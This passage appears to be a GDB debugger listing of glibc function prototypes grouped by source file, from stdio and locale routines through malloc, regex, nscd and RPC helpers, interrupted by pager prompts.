size_t _IO_getwline_info(_IO_FILE *, wchar_t *, size_t, wint_t, int, wint_t *);

File iopadn.c:
__ssize_t __GI__IO_padn(_IO_FILE *, int, __ssize_t);

File iopopen.c:
_IO_FILE *_IO_new_popen(const char *, const char *);
int _IO_new_proc_close(_IO_FILE *);
_IO_FILE *_IO_new_proc_open(_IO_FILE *, const char *, const char *);
static void unlock(void *);

File ioputs.c:
int _IO_puts(const char *);

File ioseekoff.c:
__off64_t _IO_seekoff(_IO_FILE *, __off64_t, int, int);
__off64_t _IO_seekoff_unlocked(_IO_FILE *, __off64_t, int, int);

File ioseekpos.c:
__off64_t _IO_seekpos(_IO_FILE *, __off64_t, int);
__off64_t _IO_seekpos_unlocked(_IO_FILE *, __off64_t, int);

File iosetbuffer.c:
void __GI__IO_setbuffer(_IO_FILE *, char *, size_t);

File iosetvbuf.c:
int __GI__IO_setvbuf(_IO_FILE *, char *, int, size_t);
---Type <return> to continue, or q <return> to quit---

File ioungetc.c:
int _IO_ungetc(int, _IO_FILE *);

File ioungetwc.c:
wint_t ungetwc(wint_t, _IO_FILE *);

File iovdprintf.c:
int _IO_vdprintf(int, const char *, struct __va_list_tag *);

File iovsprintf.c:
int __IO_vsprintf(char *, const char *, struct __va_list_tag *);

File iovsscanf.c:
int _IO_vsscanf(const char *, const char *, struct __va_list_tag *);

File iovswscanf.c:
int __GI___vswscanf(const wchar_t *, const wchar_t *, struct __va_list_tag *);

File iowpadn.c:
__ssize_t _IO_wpadn(_IO_FILE *, wint_t, __ssize_t);

File isastream.c:
int isastream(int);

File isctype.c:
int __isctype(int, int);

File isoc99_fscanf.c:
int __isoc99_fscanf(FILE *, const char *, ...);

File isoc99_fwscanf.c:
int __isoc99_fwscanf(FILE *, const wchar_t *, ...);

File isoc99_scanf.c:
int __isoc99_scanf(const char *, ...);

File isoc99_sscanf.c:
int __isoc99_sscanf(const char *, const char *, ...);

---Type <return> to continue, or q <return> to quit---
File isoc99_swscanf.c:
int __isoc99_swscanf(const wchar_t *, const wchar_t *, ...);

File isoc99_vfscanf.c:
int __GI___isoc99_vfscanf(FILE *, const char *, struct __va_list_tag *);

File isoc99_vfwscanf.c:
int __GI___isoc99_vfwscanf(FILE *, const wchar_t *, struct __va_list_tag *);

File isoc99_vscanf.c:
int __isoc99_vscanf(const char *, struct __va_list_tag *);

File isoc99_vsscanf.c:
int __GI___isoc99_vsscanf(const char *, const char *, struct __va_list_tag *);

File isoc99_vswscanf.c:
int __GI___isoc99_vswscanf(const wchar_t *, const wchar_t *, struct __va_list_tag *);

File isoc99_vwscanf.c:
int __isoc99_vwscanf(const wchar_t *, struct __va_list_tag *);

File isoc99_wscanf.c:
int __isoc99_wscanf(const wchar_t *, ...);

File iswctype.c:
int __GI___iswctype(wint_t, wctype_t);

File iswctype_l.c:
int __iswctype_l(wint_t, wctype_t, __locale_t);

File jrand48.c:
long jrand48(unsigned short *);

File jrand48_r.c:
int __jrand48_r(unsigned short *, struct drand48_data *, long *);

File key_call.c:
int __GI_key_decryptsession(char *, des_block *);
int __GI_key_decryptsession_pk(char *, netobj *, des_block *);
int __GI_key_encryptsession(char *, des_block *);
---Type <return> to continue, or q <return> to quit---
int __GI_key_encryptsession_pk(char *, netobj *, des_block *);
int __GI_key_gendes(des_block *);
int __GI_key_get_conv(char *, des_block *);
int __GI_key_secretkey_is_set(void);
int __GI_key_setnet(struct key_netstarg *);
int __GI_key_setsecret(char *);
void __rpc_thread_key_cleanup(void);
static CLIENT *getkeyserv_handle(int);

File key_prot.c:
bool_t __GI_xdr_cryptkeyarg(XDR *, cryptkeyarg *);

bool_t __GI_xdr_cryptkeyarg2(XDR *, cryptkeyarg2 *);
bool_t __GI_xdr_cryptkeyres(XDR *, cryptkeyres *);
bool_t __GI_xdr_getcredres(XDR *, getcredres *);
bool_t __GI_xdr_key_netstarg(XDR *, key_netstarg *);

bool_t __GI_xdr_key_netstres(XDR *, key_netstres *);
bool_t __GI_xdr_keybuf(XDR *, char *);
bool_t __GI_xdr_keystatus(XDR *, keystatus *);
bool_t __GI_xdr_netnamestr(XDR *, netnamestr *);

bool_t __GI_xdr_unixcred(XDR *, unixcred *);

File l64a.c:
char *l64a(long);

File lc-ctype.c:
void _nl_postload_ctype(void);

File lc-time-cleanup.c:
void _nl_cleanup_time(struct __locale_data *);

File lchmod.c:
int lchmod(const char *, mode_t);

File lckpwdf.c:
int __lckpwdf(void);
int __ulckpwdf(void);
static void noop_handler(int);

File lcong48.c:
void lcong48(unsigned short *);
---Type <return> to continue, or q <return> to quit---

File lcong48_r.c:
int __lcong48_r(unsigned short *, struct drand48_data *);

File libc-cleanup.c:
void __libc_cleanup_routine(struct __pthread_cleanup_frame *);

File libc_pthread_init.c:

int *__libc_pthread_init(unsigned long *, void (*)(void), const struct pthread_functions *);
static void freeres_libptread(void);

File llabs.c:
long long llabs(long long);

File lldiv.c:
lldiv_t lldiv(long long, long long);

File loadarchive.c:
void _nl_archive_subfreeres(void);
struct __locale_data *_nl_load_locale_from_archive(int, const char **);

File loadlocale.c:
struct __locale_data *_nl_intern_locale_data(int, const void *, size_t);
void _nl_load_locale(struct loaded_l10nfile *, int);
void _nl_unload_locale(struct __locale_data *);

File loadmsgcat.c:
void _nl_load_domain(struct loaded_l10nfile *, struct binding *);
void _nl_unload_domain(struct loaded_domain *);

File localealias.c:
const char *_nl_expand_alias(const char *);

static int alias_compare(const struct alias_map *, const struct alias_map *);
static size_t read_alias_file(const char *, int);

File localeconv.c:
struct lconv *__localeconv(void);

File localename.c:
const char *__current_locale_name(int);
---Type <return> to continue, or q <return> to quit---

File localtime.c:
struct tm *__GI_localtime(const time_t *);
struct tm *__localtime_r(const time_t *, struct tm *);

File lockf.c:
int lockf(int, int, off_t);

File longjmp.c:
void __libc_siglongjmp(struct __jmp_buf_tag *, int);

File lrand48.c:
long lrand48(void);

File lrand48_r.c:
int __GI_lrand48_r(struct drand48_data *, long *);

File lsearch.c:
void *__GI_lfind(const void *, const void *, size_t *, size_t, __compar_fn_t);
void *lsearch(const void *, void *, size_t *, size_t, __compar_fn_t);

File malloc.c:
void __GI___libc_free(void *);
void *__GI___libc_malloc(size_t);
int __GI___libc_mallopt(int, int);
void *__GI___libc_memalign(size_t, size_t);
void *__GI___libc_realloc(void *, size_t);
void *__libc_calloc(size_t, size_t);
struct mallinfo __libc_mallinfo(void);
void *__libc_pvalloc(size_t);
void *__libc_valloc(size_t);
int __malloc_info(FILE *, int);
void __malloc_stats(void);
int __malloc_trim(size_t);
size_t __malloc_usable_size(void *);
int __posix_memalign(void **, size_t, size_t);
static void __malloc_assert(const char *, const char *, unsigned int, const char *);
static void _int_free(mstate, mchunkptr, int);

static void *_int_malloc(mstate, size_t);
static void *_int_memalign(mstate, size_t, size_t);
---Type <return> to continue, or q <return> to quit---
static void *_int_realloc(mstate, mchunkptr, size_t, size_t);
static void int_mallinfo(mstate, struct mallinfo *);
static void malloc_consolidate(mstate);
static void malloc_printerr(int, const char *, void *, mstate);
static mchunkptr mremap_chunk(mchunkptr, size_t);
static void munmap_chunk(mchunkptr);
static void *sysmalloc(size_t, mstate);
static int systrim(size_t, mstate, mstate);

File mb_cur_max.c:
size_t __ctype_get_mb_cur_max(void);

File mblen.c:
int mblen(const char *, size_t);

File mbrlen.c:
size_t __GI___mbrlen(const char *, size_t, mbstate_t *);

File mbrtoc16.c:
size_t mbrtoc16(char16_t *, const char *, size_t, mbstate_t *);

File mbrtowc.c:
size_t __GI___mbrtowc(wchar_t *, const char *, size_t, mbstate_t *);

File mbsinit.c:
int __mbsinit(const mbstate_t *);

File mbsnrtowcs.c:
size_t __mbsnrtowcs(wchar_t *, const char **, size_t, size_t, mbstate_t *);

File mbsnrtowcs_chk.c:
size_t __mbsnrtowcs_chk(wchar_t *, const char **, size_t, size_t, mbstate_t *, size_t);

File mbsrtowcs.c:
size_t __mbsrtowcs(wchar_t *, const char **, size_t, mbstate_t *);

File mbsrtowcs_chk.c:
size_t __mbsrtowcs_chk(wchar_t *, const char **, size_t, mbstate_t *, size_t);

File mbsrtowcs_l.c:
---Type <return> to continue, or q <return> to quit---
size_t __mbsrtowcs_l(wchar_t *, const char **, size_t, mbstate_t *, __locale_t);

File mbstowcs.c:
size_t mbstowcs(wchar_t *, const char *, size_t);

File mbstowcs_chk.c:
size_t __mbstowcs_chk(wchar_t *, const char *, size_t, size_t);

File mbtowc.c:
int mbtowc(wchar_t *, const char *, size_t);

File mcheck.c:
int __GI_mcheck(void (*)(enum mcheck_status));

void __GI_mcheck_check_all(void);
int mcheck_pedantic(void (*)(enum mcheck_status));
enum mcheck_status mprobe(void *);
static void freehook(void *, const void *);
static void mabort(enum mcheck_status);
static void *mallochook(size_t, const void *);
static void *memalignhook(size_t, size_t, const void *);
static void *reallochook(void *, size_t, const void *);

File mcount.c:
void __mcount_internal(u_long, u_long);

File memccpy.c:
void *__memccpy(void *, const void *, int, size_t);

File memfrob.c:
void *memfrob(void *, size_t);

File memmem.c:
void *__GI___memmem(const void *, size_t, const void *, size_t);

File memstream.c:
_IO_FILE *__GI___open_memstream(char **, size_t *);
static void _IO_mem_finish(_IO_FILE *, int);
static int _IO_mem_sync(_IO_FILE *);

File mkdtemp.c:
---Type <return> to continue, or q <return> to quit---
char *mkdtemp(char *);

File mkostemp.c:
int mkostemp(char *, int);

File mkostemps.c:
int mkostemps(char *, int, int);

File mkstemp.c:
int mkstemp(char *);

File mkstemps.c:
int mkstemps(char *, int);

File mktemp.c:
char *__mktemp(char *);

File mktime.c:
time_t __GI_mktime(struct tm *);
time_t __mktime_internal(struct tm *, struct tm *(*)(const time_t *, struct tm *), time_t *);

File mntent.c:
struct mntent *getmntent(FILE *);
static void allocate(void);

File mntent_r.c:
int __GI___endmntent(FILE *);
struct mntent *__GI___getmntent_r(FILE *, struct mntent *, char *, int);
FILE *__GI___setmntent(const char *, const char *);
int __addmntent(FILE *, const struct mntent *);
char *__hasmntopt(const struct mntent *, const char *);
static char *decode_name(char *);

File mod_1.c:
mp_limb_t __mpn_mod_1(mp_srcptr, mp_size_t, mp_limb_t);

File morecore.c:
void *__GI___default_morecore(ptrdiff_t);

File mrand48.c:
---Type <return> to continue, or q <return> to quit---
long mrand48(void);

File mrand48_r.c:
int mrand48_r(struct drand48_data *, long *);

File msort.c:
void __GI___qsort_r(void *, size_t, size_t, __compar_d_fn_t, void *);
void __GI_qsort(void *, size_t, size_t, __compar_fn_t);

static void msort_with_tmp(const struct msort_param *, void *, size_t);

File mtrace.c:
void __GI_tr_break(void);
void mtrace(void);
void muntrace(void);
static void release_libc_mem(void);
static void tr_freehook(void *, const void *);
static void *tr_mallochook(size_t, const void *);
static void *tr_memalignhook(size_t, size_t, const void *);
static void *tr_reallochook(void *, size_t, const void *);
static void tr_where(const void *, Dl_info *);

File mul.c:
mp_limb_t __mpn_mul(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);

File mul_n.c:
void __mpn_impn_mul_n(mp_ptr, mp_srcptr, mp_srcptr, mp_size_t, mp_ptr);
void __mpn_impn_mul_n_basecase(mp_ptr, mp_srcptr, mp_srcptr, mp_size_t);
void __mpn_impn_sqr_n(mp_ptr, mp_srcptr, mp_size_t, mp_ptr);
void __mpn_impn_sqr_n_basecase(mp_ptr, mp_srcptr, mp_size_t);
void __mpn_mul_n(mp_ptr, mp_srcptr, mp_srcptr, mp_size_t);

File netname.c:
int __GI_getnetname(char *);
int __GI_host2netname(char *, const char *, const char *);
int __GI_netname2host(const char *, char *, const int);
int __GI_netname2user(const char *, uid_t *, gid_t *, int *, gid_t *);
int __GI_user2netname(char *, const uid_t, const char *);

File newlocale.c:
__locale_t __newlocale(int, const char *, __locale_t);
---Type <return> to continue, or q <return> to quit---

File ngettext.c:
char *__ngettext(const char *, const char *, unsigned long);

File nis_hash.c:
uint32_t __nis_hash(const void *, size_t);

File nl_langinfo.c:
char *__GI_nl_langinfo(nl_item);

File nl_langinfo_l.c:
char *__GI___nl_langinfo_l(nl_item, __locale_t);

File noophooks.c:
void __cyg_profile_func_enter(void *, void *);

File nrand48.c:
long nrand48(unsigned short *);

File nrand48_r.c:
int __nrand48_r(unsigned short *, struct drand48_data *, long *);

File nsap_addr.c:
u_int inet_nsap_addr(const char *, u_char *, int);

char *inet_nsap_ntoa(int, const u_char *, char *);

File nscd_getai.c:
int __nscd_getai(const char *, struct nscd_ai_result **, int *);

File nscd_getgr_r.c:
int __nscd_getgrgid_r(gid_t, struct group *, char *, size_t, struct group **);
int __nscd_getgrnam_r(const char *, struct group *, char *, size_t, struct group **);
static void gr_map_free(void);
static int nscd_getgr_r(const char *, size_t, request_type, struct group *, char *, size_t, struct group **);

File nscd_gethst_r.c:
uint32_t __nscd_get_nl_timestamp(void);
int __nscd_gethostbyaddr_r(const void *, socklen_t, int, struct hostent *, char *, size_t, struct hostent **, int *);
int __nscd_gethostbyname2_r(const char *, int, struct hostent *, char *, size_t, struct hostent **, int *);
int __nscd_gethostbyname_r(const char *, struct hostent *, char *, size_t, struct hostent **, int *);
---Type <return> to continue, or q <return> to quit---
static void hst_map_free(void);
static int nscd_gethst_r(const char *, size_t, request_type, struct hostent *, char *, size_t, struct hostent **, int *);

File nscd_getpw_r.c:

int __nscd_getpwnam_r(const char *, struct passwd *, char *, size_t, struct passwd **);
int __nscd_getpwuid_r(uid_t, struct passwd *, char *, size_t, struct passwd **);
static int nscd_getpw_r(const char *, size_t, request_type, struct passwd *, char *, size_t, struct passwd **);
static void pw_map_free(void);

File nscd_getserv_r.c:
int __nscd_getservbyname_r(const char *, const char *, struct servent *, char *, size_t, struct servent **);
int __nscd_getservbyport_r(int, const char *, struct servent *, char *, size_t, struct servent **);
static int nscd_getserv_r(const char *, size_t, const char *, request_type, struct servent *, char *, size_t, struct servent **);
static void serv_map_free(void);

File nscd_helper.c:
struct datahead *__nscd_cache_search(request_type, const char *, size_t, const struct mapped_database *, size_t);

struct mapped_database *__nscd_get_map_ref(request_type, const char *, volatile struct locked_map_ptr *, int *);
struct mapped_database *__nscd_get_mapping(request_type, const char *, struct mapped_database **);
int __nscd_open_socket(const char *, size_t, request_type, void *, size_t);
void __nscd_unmap(struct mapped_database *);
ssize_t __readall(int, void *, size_t);
ssize_t __readvall(int, const struct iovec *, int);
static int open_socket(request_type, const char *, size_t);

File nscd_initgroups.c:
int __nscd_getgrouplist(const char *, gid_t, long *, gid_t **, long);

File nscd_netgroup.c:
int __nscd_innetgr(const char *, const char *, const char *, const char *);
int __nscd_setnetgrent(const char *, struct __netgrent *);
static void pw_map_free(void);

File nsswitch.c:
int __GI___nss_database_lookup(const char *, const char *, const char *, service_user **);
int __GI___nss_lookup(service_user **, const char *, const char *, void **);
void *__GI___nss_lookup_function(service_user *, const char *);
int __GI___nss_next2(service_user **, const char *, const char *, void **, int, int);
int __nss_configure_lookup(const char *, const char *);
void __nss_disable_nscd(void (*)(size_t, struct traced_file *));

---Type <return> to continue, or q <return> to quit---
int __nss_next(service_user **, const char *, void **, int, int);
static void free_defconfig(void);
static void free_mem(void);
static int known_compare(const void *, const void *);
static int nss_load_library(service_user *);
static service_user *nss_parse_service_list(const char *);

File obprintf.c:
int _IO_obstack_printf(struct obstack *, const char *, ...);
int _IO_obstack_vprintf(struct obstack *, const char *, struct __va_list_tag *);
static int _IO_obstack_overflow(_IO_FILE *, int);
static size_t _IO_obstack_xsputn(_IO_FILE *, const void *, size_t);

File obprintf_chk.c:
int __GI___obstack_vprintf_chk(struct obstack *, int, const char *, struct __va_list_tag *);
int __obstack_printf_chk(struct obstack *, int, const char *, ...);

File obstack.c:
void __GI__obstack_newchunk(struct obstack *, int);
int _obstack_allocated_p(struct obstack *, void *);
int _obstack_begin(struct obstack *, int, int, void *(*)(long), void (*)(void *));
int _obstack_begin_1(struct obstack *, int, int, void *(*)(void *, long), void (*)(void *, void *), void *);
int _obstack_memory_used(struct obstack *);
void obstack_free(struct obstack *, void *);
static void print_and_abort(void);

File offtime.c:
int __offtime(const time_t *, long, struct tm *);

File oldfmemopen.c:
FILE *__old_fmemopen(void *, size_t, const char *);
static int fmemopen_close(void *);
static ssize_t fmemopen_read(void *, char *, size_t);
static int fmemopen_seek(void *, __off64_t *, int);
static ssize_t fmemopen_write(void *, const char *, size_t);

File on_exit.c:
int __on_exit(void (*)(int, void *), void *);

File open64_2.c:
---Type <return> to continue, or q <return> to quit---
int __open64_2(const char *, int);

File open_2.c:
int __open_2(const char *, int);

File open_catalog.c:
int __GI___open_catalog(const char *, const char *, const char *, __nl_catd);

File openat64_2.c:
int __openat64_2(int, const char *, int);

File openat_2.c:
int __openat_2(int, const char *, int);

File openchild.c:
int _openchild(const char *, FILE **, FILE **);

File pclose.c:
int __new_pclose(FILE *);

File peekc.c:
int _IO_peekc_locked(_IO_FILE *);

File perror.c:
void __GI_perror(const char *);
static void perror_internal(FILE *, const char *, int);

File plural-exp.c:
void __gettext_extract_plural(const char *, const struct expression **, unsigned long *);

File plural.c:
int __gettextparse(struct parse_args *);

File plural.y:
void __gettext_free_exp(struct expression *);

File pm_getmaps.c:
struct pmaplist *__GI_pmap_getmaps(struct sockaddr_in *);


File pm_getport.c:
---Type <return> to continue, or q <return> to quit---
u_short __GI___libc_rpc_getport(struct sockaddr_in *, u_long, u_long, u_int, time_t, time_t);
u_short __GI_pmap_getport(struct sockaddr_in *, u_long, u_long, u_int);
int __get_socket(struct sockaddr_in *);

File pmap_clnt.c:
bool_t __GI_pmap_set(u_long, u_long, int, u_short);
bool_t __GI_pmap_unset(u_long, u_long);

File pmap_prot.c:
bool_t __GI_xdr_pmap(XDR *, struct pmap *);

File pmap_prot2.c:
bool_t __GI_xdr_pmaplist(XDR *, struct pmaplist **);

File pmap_rmt.c:
enum clnt_stat __GI_clnt_broadcast(u_long, u_long, u_long, xdrproc_t, caddr_t, xdrproc_t, caddr_t, resultproc_t);
enum clnt_stat __GI_pmap_rmtcall(struct sockaddr_in *, u_long, u_long, u_long, xdrproc_t, caddr_t, xdrproc_t, caddr_t, struct timeval, 
    u_long *);

bool_t __GI_xdr_rmtcall_args(XDR *, struct rmtcallargs *);
bool_t __GI_xdr_rmtcallres(XDR *, struct rmtcallres *);

File poll_chk.c:
int __poll_chk(struct pollfd *, nfds_t, int, unsigned long);

File ppoll_chk.c:
int __ppoll_chk(struct pollfd *, nfds_t, const struct timespec *, const __sigset_t *, unsigned long);

File pread64_chk.c:
ssize_t __pread64_chk(int, void *, size_t, off64_t, size_t);

File pread_chk.c:
ssize_t __pread_chk(int, void *, size_t, off_t, size_t);

File printf-parse.h:
static int read_int(const unsigned char **);

File printf-parsemb.c:

size_t __parse_one_specmb(const unsigned char *, size_t, struct printf_spec *, size_t *);
size_t __parse_one_specwc(const unsigned int *, size_t, struct printf_spec *, size_t *);

---Type <return> to continue, or q <return> to quit---
File printf-prs.c:
size_t parse_printf_format(const char *, size_t, int *);

File printf.c:
int __printf(const char *, ...);

File printf_chk.c:
int ___printf_chk(int, const char *, ...);

File printf_fp.c:
int __GI___printf_fp_l(_IO_FILE *, locale_t, const struct printf_info *, const void * const *);

int ___printf_fp(_IO_FILE *, const struct printf_info *, const void * const *);
unsigned int __guess_grouping(unsigned int, const char *);
static wchar_t hack_digit(struct hack_digit_param *);

File printf_size.c:
int __printf_size(_IO_FILE *, const struct printf_info *, const void * const *);
int printf_size_info(const struct printf_info *, size_t, int *);

File psiginfo.c:
void psiginfo(const siginfo_t *, const char *);

File psignal.c:
void psignal(int, const char *);

File ptsname_r_chk.c:
int __ptsname_r_chk(int, char *, size_t, size_t);

File publickey.c:
int __GI_getpublickey(const char *, char *);
int __GI_getsecretkey(const char *, char *, const char *);

File putc.c:
int __GI__IO_putc(int, _IO_FILE *);

File putc_u.c:
int putc_unlocked(int, _IO_FILE *);

File putchar.c:
int putchar(int);
---Type <return> to continue, or q <return> to quit---

File putchar_u.c:
int putchar_unlocked(int);

File putenv.c:
int putenv(char *);

File putgrent.c:
int putgrent(const struct group *, FILE *);

File putmsg.c:
int putmsg(int, const struct strbuf *, const struct strbuf *, int);

File putpwent.c:
int putpwent(const struct passwd *, FILE *);

File putsgent.c:
int putsgent(const struct sgrp *, FILE *);

File putspent.c:
int putspent(const struct spwd *, FILE *);

File pututxline.c:
struct utmpx *pututxline(const struct utmpx *);

File putw.c:
int putw(int, FILE *);

File putwc.c:
wint_t __GI_putwc(wchar_t, _IO_FILE *);

File putwc_u.c:
wint_t __GI_putwc_unlocked(wchar_t, _IO_FILE *);

File putwchar.c:
wint_t putwchar(wchar_t);

File putwchar_u.c:
wint_t putwchar_unlocked(wchar_t);

---Type <return> to continue, or q <return> to quit---
File qsort.c:
void _quicksort(void * const, size_t, size_t, __compar_d_fn_t, void *);

File quick_exit.c:
void quick_exit(int);

File rand.c:
int rand(void);

File rand_r.c:
int rand_r(unsigned int *);

File random.c:
char *__initstate(unsigned int, char *, size_t);
long __random(void);
char *__setstate(char *);
void __srandom(unsigned int);

File random_r.c:
int __initstate_r(unsigned int, char *, size_t, struct random_data *);
int __random_r(struct random_data *, int32_t *);
int __setstate_r(char *, struct random_data *);
int __srandom_r(unsigned int, struct random_data *);

File rcmd.c:
int __GI_iruserok_af(const void *, int, const char *, const char *, sa_family_t);
int __GI_rcmd_af(char **, u_short, const char *, const char *, const char *, int *, sa_family_t);
int __GI_rresvport_af(int *, sa_family_t);
int __GI_ruserok_af(const char *, int, const char *, const char *, sa_family_t);
int __ivaliduser(FILE *, u_int32_t, const char *, const char *);
int iruserok(u_int32_t, int, const char *, const char *);
int rcmd(char **, u_short, const char *, const char *, const char *, int *);
int rresvport(int *);
int ruserok(const char *, int, const char *, const char *);
static int __validuser2_sa(FILE *, struct sockaddr *, size_t, const char *, const char *, const char *);
static FILE *iruserfopen(const char *, uid_t);
static int ruserok2_sa(struct sockaddr *, size_t, int, const char *, const char *, const char *);

File read_chk.c:
ssize_t __read_chk(int, void *, size_t, size_t);
---Type <return> to continue, or q <return> to quit---

File readlink_chk.c:
ssize_t __readlink_chk(const char *, void *, size_t, size_t);

File readlinkat_chk.c:
ssize_t __readlinkat_chk(int, const char *, void *, size_t, size_t);

File realpath_chk.c:
char *__realpath_chk(const char *, char *, size_t);

File recv_chk.c:
ssize_t __recv_chk(int, void *, size_t, size_t, int);

File recvfrom_chk.c:
ssize_t __recvfrom_chk(int, void *, size_t, size_t, int, __SOCKADDR_ARG, socklen_t *);


File reg-modifier.c:
int __handle_registered_modifier_mb(const unsigned char **, struct printf_info *);
int __handle_registered_modifier_wc(const unsigned int **, struct printf_info *);
int __register_printf_modifier(const wchar_t *);
static void free_mem(void);

File reg-printf.c:
int __register_printf_function(int, printf_function *, printf_arginfo_function *);
int __register_printf_specifier(int, printf_function *, printf_arginfo_size_function *);

File reg-type.c:
int __register_printf_type(printf_va_arg_function *);


File regcomp.c:
int __re_compile_fastmap(struct re_pattern_buffer *);
const char *__re_compile_pattern(const char *, size_t, struct re_pattern_buffer *);
reg_syntax_t __re_set_syntax(reg_syntax_t);
int __regcomp(regex_t * restrict, const char * restrict, int);
size_t __regerror(int, const regex_t * restrict, char * restrict, size_t);
void __regfree(regex_t *);
char *re_comp(const char *);

static reg_errcode_t build_charclass(unsigned char *, bitset_word_t *, int *, const unsigned char *, reg_syntax_t, re_charset_t *, 
    re_charset_t *);
static bin_tree_t *build_charclass_op(re_dfa_t *, unsigned char *, const unsigned char *, const unsigned char *, int, reg_errcode_t *);
---Type <return> to continue, or q <return> to quit---
static reg_errcode_t calc_eclosure_iter(re_node_set *, re_dfa_t *, int, int);
static bin_tree_t *create_token_tree(bin_tree_t *, bin_tree_t *, const re_token_t *, re_dfa_t *, re_dfa_t *);

static reg_errcode_t duplicate_node_closure(re_dfa_t *, int, int, int, unsigned int);
static void free_dfa_content(re_dfa_t *);
static void free_mem(void);
static reg_errcode_t free_tree(void *, bin_tree_t *);
static bin_tree_t *lower_subexp(reg_errcode_t *, regex_t *, bin_tree_t *);
static reg_errcode_t parse_bracket_element(bracket_elem_t *, re_string_t *, re_token_t *, int, reg_syntax_t, int, re_dfa_t *);

static bin_tree_t *parse_branch(re_string_t *, regex_t *, re_token_t *, reg_syntax_t, int, reg_errcode_t *);
static bin_tree_t *parse_expression(re_string_t *, regex_t *, re_token_t *, reg_syntax_t, int, reg_errcode_t *);
static bin_tree_t *parse_reg_exp(re_string_t *, regex_t *, re_token_t *, reg_syntax_t, int, reg_errcode_t *);
static int peek_token(re_token_t *, re_string_t *, reg_syntax_t);
static int peek_token_bracket(re_token_t *, re_string_t *, reg_syntax_t);
static reg_errcode_t postorder(bin_tree_t *, void *, reg_errcode_t (*)(void *, bin_tree_t *));
static void re_compile_fastmap_iter(regex_t *, char *, const re_dfastate_t *, const re_dfastate_t *);
static reg_errcode_t re_compile_internal(regex_t *, const char *, size_t, reg_syntax_t);

File regex_internal.c:
static void build_upper_buffer(re_string_t *);
static void build_wcs_buffer(re_string_t *);
static reg_errcode_t build_wcs_upper_buffer(re_string_t *);
static re_dfastate_t *re_acquire_state(reg_errcode_t *, const re_dfa_t *, const re_node_set *);
static re_dfastate_t *re_acquire_state_context(reg_errcode_t *, const re_dfa_t *, const re_node_set *, unsigned int);
static int re_dfa_add_node(re_dfa_t *, re_token_t);
static reg_errcode_t re_node_set_add_intersect(re_node_set *, const re_node_set *, const re_node_set *);
static int re_node_set_contains(int, const re_node_set *, const re_node_set *);
static reg_errcode_t re_node_set_init_union(re_node_set *, const re_node_set *, const re_node_set *);
static int re_node_set_insert(re_node_set *, int);
static reg_errcode_t re_node_set_merge(re_node_set *, const re_node_set *);
static unsigned int re_string_context_at(const re_string_t *, int, int);
static reg_errcode_t re_string_reconstruct(re_string_t *, int, int);
static reg_errcode_t register_state(const re_dfa_t *, re_dfastate_t *, unsigned int);

File regexec.c:
int __compat_regexec(const regex_t * restrict, const char * restrict, size_t, regmatch_t *, int);
int __re_match(struct re_pattern_buffer *, const char *, int, int, struct re_registers *);

int __re_match_2(struct re_pattern_buffer *, const char *, int, const char *, int, int, struct re_registers *, int);
int __re_search(struct re_pattern_buffer *, const char *, int, int, int, struct re_registers *);
int __re_search_2(struct re_pattern_buffer *, const char *, int, const char *, int, int, int, struct re_registers *, int);
void __re_set_registers(struct re_pattern_buffer *, struct re_registers *, unsigned int, regoff_t *, regoff_t *);
---Type <return> to continue, or q <return> to quit---
int __regexec(const regex_t * restrict, const char * restrict, size_t, regmatch_t *, int);
int re_exec(const char *);
static int build_trtable(const re_dfa_t *, re_dfastate_t *);
static reg_errcode_t check_arrival(re_match_context_t *, state_array_t *, int, int, int, int, int);
static reg_errcode_t check_arrival_expand_ecl(const re_dfa_t *, re_node_set *, int, int);
static reg_errcode_t check_arrival_expand_ecl_sub(const re_dfa_t *, re_node_set *, int, int, int);
static int check_dst_limits(const re_match_context_t *, re_node_set *, int, int, int, int);
static int check_dst_limits_calc_pos_1(const re_match_context_t *, int, int, int, int);
static int check_halt_state_context(const re_match_context_t *, int, const re_dfastate_t *, const re_dfastate_t *);
static int check_node_accept(const re_match_context_t *, const re_token_t *, int);
static int check_node_accept_bytes(int, const re_string_t *, int, const re_dfa_t *, const re_dfa_t *);
static reg_errcode_t check_subexp_matching_top(re_match_context_t *, re_node_set *, int);
static reg_errcode_t expand_bkref_cache(re_match_context_t *, re_node_set *, int, int, int);
static reg_errcode_t extend_buffers(re_match_context_t *, int);

static reg_errcode_t free_fail_stack_return(struct re_fail_stack_t *);
static reg_errcode_t get_subexp_sub(re_match_context_t *, re_sub_match_last_t *, int, int, const re_sub_match_top_t *);
static re_dfastate_t *merge_state_with_log(reg_errcode_t *, re_match_context_t *, re_dfastate_t *);
static int pop_fail_stack(struct re_fail_stack_t *, int *, int, regmatch_t *, re_node_set *);
static reg_errcode_t re_search_internal(const regex_t *, const char *, int, int, int, int, size_t, regmatch_t *, int);
static int re_search_stub(struct re_pattern_buffer *, const char *, int, int, int, int, struct re_registers *, int);
static reg_errcode_t set_regs(const regex_t *, const re_match_context_t *, size_t, regmatch_t *, int);
static reg_errcode_t sift_states_backward(const re_match_context_t *, re_sift_context_t *);
static reg_errcode_t sub_epsilon_src_nodes(const re_dfa_t *, int, re_node_set *, const re_node_set *);
static reg_errcode_t transit_state_bkref(re_match_context_t *, const re_node_set *);
static reg_errcode_t update_cur_sifted_state(const re_match_context_t *, re_sift_context_t *, int, re_node_set *);

File regexp.c:
int advance(const char *, const char *);

int step(const char *, const char *);

File register-atfork.c:
int __GI___register_atfork(void (*)(void), void (*)(void), void (*)(void), void *);
void __linkin_atfork(struct fork_handler *);
static void free_mem(void);

File res-state.c:
struct __res_state *__GI___res_state(void);

File res_hconf.c:
void _res_hconf_init(void);
---Type <return> to continue, or q <return> to quit---
void _res_hconf_reorder_addrs(struct hostent *);
void _res_hconf_trim_domain(char *);
void _res_hconf_trim_domains(struct hostent *);
static const char *arg_spoof(const char *, int, const char *);
static const char *arg_trimdomain_list(const char *, int, const char *);
static void do_init(void);

File res_init.c:
void __GI___res_iclose(res_state, _Bool);
void __GI___res_nclose(res_state);
int __GI___res_ninit(res_state);

u_int __GI___res_randomid(void);
int __res_vinit(res_state, int);
static void res_setoptions(res_state, const char *, const char *);
static void res_thread_freeres(void);

File res_libc.c:
int __GI___res_maybe_init(res_state, int);
int __res_init(void);

File revoke.c:
int revoke(const char *);

File rewind.c:
void __GI_rewind(_IO_FILE *);

File rewrite_field.c:
const char *__nss_rewrite_field(const char *, char **);

File rexec.c:
int __GI_rexec_af(char **, int, const char *, const char *, const char *, int *, sa_family_t);
int rexec(char **, int, const char *, const char *, const char *, int *);

File rpc_cmsg.c:
bool_t __GI_xdr_callmsg(XDR *, struct rpc_msg *);

File rpc_dtable.c:
